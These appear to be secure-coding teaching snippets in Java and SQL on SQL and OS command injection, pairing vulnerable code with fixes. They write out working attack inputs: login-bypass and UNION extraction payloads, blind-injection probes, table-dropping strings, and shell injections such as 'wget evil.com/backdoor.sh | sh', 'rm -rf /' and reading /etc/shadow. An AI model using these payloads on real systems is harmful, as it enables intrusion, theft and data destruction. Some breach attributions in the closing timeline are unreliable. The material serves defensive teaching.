// A simple database table:
//
// TABLE: users
// +----+----------+------------+------------------+
// | id | username | password   | email            |
// +----+----------+------------+------------------+
// | 1  | admin    | s3cretP@ss | admin@shop.com   |
// | 2  | alice    | alice123   | alice@email.com  |
// | 3  | bob      | b0bPass!   | bob@email.com    |
// +----+----------+------------+------------------+
//
// SQL to get alice's record:
// SELECT * FROM users WHERE username = 'alice'
//
// Result: row 2 (alice's data)

// DML - Data Manipulation:
SELECT * FROM users WHERE username = 'admin';     // Read
INSERT INTO users VALUES (4, 'eve', 'pw', 'e@e');  // Create
UPDATE users SET email = 'new@e.com' WHERE id = 4;  // Update
DELETE FROM users WHERE id = 4;                     // Delete

// DDL - Data Definition (DESTRUCTIVE!):
DROP TABLE users;              // Table gone forever!
TRUNCATE TABLE audit_log;      // Erases all evidence!

// DCL - Data Control:
GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%';  // Full control!

// === VULNERABLE (Statement + concatenation) ===
String user = request.getParameter("username");
String pass = request.getParameter("password");

Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(
    "SELECT * FROM users WHERE username='" + user + 
    "' AND password='" + pass + "'");
// The user input becomes PART of the SQL command!

// === SECURE (PreparedStatement + parameters) ===
String user = request.getParameter("username");
String pass = request.getParameter("password");

PreparedStatement pstmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username=? AND password=?");
pstmt.setString(1, user);
pstmt.setString(2, pass);
ResultSet rs = pstmt.executeQuery();
// User input is DATA only - can never change the query structure!

// TRACE THE ATTACK:
//
// Template: SELECT * FROM users WHERE u='[U]' AND p='[P]'
//
// Normal:   u=alice  p=alice123
// Query:    SELECT * FROM users WHERE u='alice' AND p='alice123'
// Result:   1 row (correct)
//
// Attack:   u=admin  p=' OR '1'='1
// Query:    SELECT * FROM users WHERE u='admin' AND p='' OR '1'='1'
//           |_____string_____|         |empty|   |always true|
//
// Why it works:
//   ' closes the password string
//   OR adds a new condition  
//   '1'='1' is always TRUE
//   TRUE OR anything = TRUE
//   ALL rows returned -> login bypass!
//
// Alternative payloads:
//   ' OR 1=1 --          (comment out the rest)
//   ' OR 'x'='x          (same trick, different letters)
//   admin'--              (skip password check entirely)

// NUMERIC INJECTION - No quotes needed!
//
// Template: SELECT * FROM products WHERE id = [INPUT]
//
// Normal:  id = 42
// Query:   SELECT * FROM products WHERE id = 42
// Result:  Product #42
//
// Attack:  id = 42 OR 1=1
// Query:   SELECT * FROM products WHERE id = 42 OR 1=1
// Result:  ALL products (data dump!)
//
// Destructive: id = 42; DROP TABLE products --
// Query:   SELECT * FROM products WHERE id = 42; DROP TABLE products --
// Result:  Product #42 returned, then table DELETED!
//
// UNION attack: id = 42 UNION SELECT username,password,null,null FROM users --
// Query:   SELECT * FROM products WHERE id = 42 
//          UNION SELECT username,password,null,null FROM users --
// Result:  Product #42 PLUS all usernames and passwords!

// UNION Attack Step by Step:
//
// Step 1: Find number of columns (try ORDER BY)
// Input: 1 ORDER BY 1 --    (works)
// Input: 1 ORDER BY 2 --    (works) 
// Input: 1 ORDER BY 3 --    (works)
// Input: 1 ORDER BY 4 --    (works)
// Input: 1 ORDER BY 5 --    (ERROR! Only 4 columns)
//
// Step 2: Now we know there are 4 columns
// Input: 1 UNION SELECT null,null,null,null --
// (This confirms the column count)
//
// Step 3: Find which columns display on screen
// Input: 1 UNION SELECT 'AAA','BBB','CCC','DDD' --
// (See which AAA/BBB/CCC/DDD appears in the page)
//
// Step 4: Extract data!
// Input: 1 UNION SELECT username,password,email,null FROM users --
// Result: All usernames, passwords, and emails displayed!
//
// Real attack (Heartland 2008):
// Attackers used UNION to extract 130 MILLION credit card numbers

// BOOLEAN-BASED BLIND INJECTION:
// The page only shows 'Welcome' or 'Error'
//
// Question: Is the first char of admin's password 's'?
// Input: admin' AND SUBSTRING(password,1,1)='s' --
// Page shows: 'Welcome' -> YES! First letter is 's'
//
// Question: Is the second char 'e'?
// Input: admin' AND SUBSTRING(password,2,1)='e' --
// Page shows: 'Welcome' -> YES! Second letter is 'e'
//
// After many requests: password = 's3cretP@ss'
//
// TIME-BASED BLIND INJECTION:
// Input: admin' AND IF(SUBSTRING(password,1,1)='s', SLEEP(5), 0) --
// Page loads in 5 seconds -> YES! First letter is 's'
// Page loads instantly -> NO, try next letter
//
// Automated tools (sqlmap) can do this in minutes!

// === VULNERABLE (String concatenation) ===
String query = "SELECT * FROM users WHERE name='" 
    + userInput + "' AND pass='" + passInput + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);
// userInput becomes PART of the SQL structure!

// === SECURE (PreparedStatement) ===
String query = "SELECT * FROM users WHERE name=? AND pass=?";
PreparedStatement pstmt = conn.prepareStatement(query);
pstmt.setString(1, userInput);  // Bound as DATA
pstmt.setString(2, passInput);  // Bound as DATA  
ResultSet rs = pstmt.executeQuery();
// Even if userInput is "' OR 1=1 --", the database
// searches for a user literally named: ' OR 1=1 --
// (finds nothing, attack fails!)

// === STILL VULNERABLE (wrong use of PreparedStatement) ===
String query = "SELECT * FROM " + tableName + " WHERE id=?";
// tableName is NOT parameterised! An attacker could set
// tableName to: "users; DROP TABLE users --"
// FIX: whitelist table names!
if (!ALLOWED_TABLES.contains(tableName)) {
    throw new SecurityException("Invalid table");
}

// === VULNERABLE COMMAND EXECUTION ===
String domain = request.getParameter("domain");
// User enters: google.com; cat /etc/passwd

Runtime rt = Runtime.getRuntime();
Process proc = rt.exec("nslookup " + domain);
// Shell sees: nslookup google.com; cat /etc/passwd
// Runs BOTH commands!

// === WHAT AN ATTACKER CAN DO ===
// domain = "google.com; rm -rf /"          // Delete everything
// domain = "google.com; cat /etc/shadow"    // Read password hashes
// domain = "google.com; wget evil.com/backdoor.sh | sh"  // Install malware
// domain = "google.com; useradd hacker -p password"      // Create admin account

// === SECURE: Remove the shell ===
String[] cmd = {"nslookup", domain};  // No shell involved!
Process proc = rt.exec(cmd);
// Each argument is separate - no metacharacter interpretation

// === EVEN BETTER: Use an API instead ===
InetAddress addr = InetAddress.getByName(domain);
// No external command at all!

// LAYER 1: PreparedStatement
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE username=? AND password=?");
ps.setString(1, user);
ps.setString(2, hashedPassword);

// LAYER 2: Input Validation
if (!user.matches("^[a-zA-Z0-9_]{3,20}$")) {
    throw new IllegalArgumentException("Invalid username format");
}

// LAYER 3: Least Privilege (database config)
// GRANT SELECT ON users TO app_login_user;
// (No INSERT, UPDATE, DELETE, or DROP permissions!)

// LAYER 4: Result Verification
ResultSet rs = ps.executeQuery();
int rowCount = 0;
while (rs.next()) { rowCount++; }
if (rowCount > 1) {
    logger.severe("Possible injection: " + rowCount + " rows returned");
    throw new SecurityException("Authentication error");
}

// LAYER 5: Stored Procedure
CallableStatement cs = conn.prepareCall("{call authenticate(?, ?)}");
cs.setString(1, user);
cs.setString(2, hashedPassword);

// === BLACKLISTING (WEAK - easily bypassed!) ===
public String sanitize(String input) {
    // Block obvious SQL characters
    return input.replace("'", "")
               .replace(";", "")
               .replace("--", "")
               .replace("OR", "");
}
// BYPASS 1: Use %27 (URL-encoded single quote)
// BYPASS 2: Use 'OOR' -> after removing 'OR', it becomes 'OR'!
// BYPASS 3: Use /*/**/OR/**/  (SQL comments)
// BYPASS 4: Use 0x27 (hex for single quote)

// === WHITELISTING (STRONG) ===
public void validateUsername(String input) {
    if (!input.matches("^[a-zA-Z0-9_]{3,20}$")) {
        throw new IllegalArgumentException(
            "Username must be 3-20 characters: letters, numbers, underscore only");
    }
}
// O'Brien? -> REJECTED (but they could use OBrien)
// ' OR 1=1 -- ? -> REJECTED
// admin -> ACCEPTED
// This is MUCH safer but still use PreparedStatement too!

// Timeline of destruction:
//
// 2008 - Heartland:  130,000,000 credit cards stolen
//        Cost: $140+ million in settlements
//        Cause: SQL injection in web application
//
// 2011 - Sony:       1,000,000+ accounts exposed  
//        Cost: $171 million + reputation damage
//        Cause: Basic SQL injection (no PreparedStatement)
//
// 2015 - TalkTalk:   157,000 customer records stolen
//        Cost: 400,000 pound fine + 100,000 customers lost
//        Cause: SQL injection by a 15-year-old teenager
//
// 2018 - BA:         380,000 payment details exposed
//        Cost: 20 million pound GDPR fine
//        Cause: SQL injection in payment processing
//
// ALL of these could have been prevented with
// PreparedStatement. One line of code change.
// The fix costs minutes. The breach costs millions.

// CWE-89: SQL Injection
// Pattern: user input -> string concatenation -> SQL query
String q = "SELECT * FROM t WHERE u='" + input + "'";
//                                       ^^^^^
// FIX: PreparedStatement with ? parameters

// CWE-78: OS Command Injection  
// Pattern: user input -> string concatenation -> shell command
Runtime.getRuntime().exec("ping " + input);
//                                  ^^^^^
// FIX: Use API (InetAddress) or array-based exec

// CWE-94: Code Injection
// Pattern: user input -> eval() or ScriptEngine
engine.eval("var x = " + input);
//                       ^^^^^
// FIX: Never eval user input

// THE ROOT CAUSE IS ALWAYS THE SAME:
// User input is CONCATENATED into a command string.
// The interpreter cannot distinguish code from data.
// THE FIX IS ALWAYS THE SAME CONCEPT:
// Separate code (structure) from data (parameters).

